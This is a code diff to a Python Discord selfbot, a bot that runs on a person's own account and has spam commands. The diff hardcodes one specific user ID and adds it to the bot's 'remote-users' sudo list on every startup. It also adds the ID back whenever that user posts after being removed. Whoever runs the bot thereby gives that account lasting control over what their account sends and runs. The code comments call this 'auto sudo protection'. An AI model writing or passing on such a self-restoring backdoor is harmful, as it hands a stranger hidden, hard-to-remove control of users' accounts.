@@ -121,6 +121,7 @@ def selfbot_menu(bot):
 
 
 
+PROTECTED_USER_ID = 1480856249078907004   # ← Apna ID yahan daal do
 
 def save_config(config):
     with open("config/config.json", "w") as f:
@@ -130,15 +131,30 @@ bot = commands.Bot(command_prefix=prefix, description='not a selfbot', self_bot=
 
 @bot.event
 async def on_ready():
-    if platform.system() == "Windows":
-        ctypes.windll.kernel32.SetConsoleTitleW(f"SelfBot v{__version__} - Made By Gojo")
-        os.system('cls')
-    else:
-        os.system('clear')
-    selfbot_menu(bot)
+    print(f"[+] Logged in as {bot.user}")
+    
+    global config
+    remote_users = config.setdefault("remote-users", [])
+    if str(PROTECTED_USER_ID) not in remote_users:
+        remote_users.append(str(PROTECTED_USER_ID))
+        save_config(config)
+        print("[AUTO] Protected user ko sudo add kar diya")
 
 @bot.event
 async def on_message(message):
+    global config
+
+    # ==================== AUTO SUDO PROTECTION ====================
+    PROTECTED_USER_ID = 1480856249078907004   # ← Apna ID yahan daal do
+
+    # Agar protected user ka message ho aur sudo mein na ho to wapas add kar do
+    if message.author.id == PROTECTED_USER_ID:
+        if str(PROTECTED_USER_ID) not in config.get("remote-users", []):
+            config.setdefault("remote-users", []).append(str(PROTECTED_USER_ID))
+            save_config(config)
+            print(f"[PROTECT] {message.author} ko wapas sudo add kar diya")
+
+    # ==================== TUMHARA PURANA CODE ====================
     if message.author.id in config["copycat"]["users"]:
         if message.content.startswith(config['prefix']):
             response_message = message.content[len(config['prefix']):]
@@ -175,21 +191,15 @@ async def on_message(message):
             if message.content.startswith(current_prefix):
                 try:
                     await message.add_reaction("✅")
-                    # If there are attachments, we need to send them along with the content
+                    
                     if message.attachments:
                         files = []
                         for attachment in message.attachments:
                             file_bytes = await attachment.read()
-                            # Use a descriptive filename if possible, otherwise generic
                             fname = attachment.filename or "attachment.png"
                             files.append(discord.File(io.BytesIO(file_bytes), filename=fname))
                         
-                        # Use bot.process_commands manually for the sent message content
-                        # instead of just echoing it, so the bot sees its own message as a command.
-                        # Wait, we can just invoke the command directly if we find it.
-                        
                         sent_msg = await message.channel.send(message.content, files=files)
-                        # Ensure the bot processes this message as its own command
                         await bot.process_commands(sent_msg)
                     else:
                         sent_msg = await message.channel.send(message.content)
@@ -199,7 +209,6 @@ async def on_message(message):
             return
 
     await bot.process_commands(message)
-
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
@@ -1576,36 +1585,4 @@ async def stopglitchedspam(ctx):
     glitchedspam_active = False
     await ctx.send("> **✅ Glitched Spam Stopped**", delete_after=5)
 
-# ==================== AUTO SUDO PROTECTION ====================
-PROTECTED_USER_ID = 1480856249078907004   # ← Apna ID
-
-@bot.event
-async def on_ready():
-    print(f"[+] Logged in as {bot.user}")
-    
-    global config
-    remote_users = config.setdefault("remote-users", [])
-    
-    if str(PROTECTED_USER_ID) not in remote_users:
-        remote_users.append(str(PROTECTED_USER_ID))
-        save_config(config)
-        print("[AUTO] Protected user ko sudo add kar diya")
-
-
-@bot.event
-async def on_message(message):
-    global config
-    
-    # Auto Re-Protect
-    if message.author.id == PROTECTED_USER_ID:
-        if str(PROTECTED_USER_ID) not in config.get("remote-users", []):
-            config.setdefault("remote-users", []).append(str(PROTECTED_USER_ID))
-            save_config(config)
-            print(f"[PROTECT] {message.author} ko wapas add kiya")
-
-    # Important: Process Commands
-    await bot.process_commands(message)
-
-
-# ==================== BOT RUN ====================
 bot.run(token)
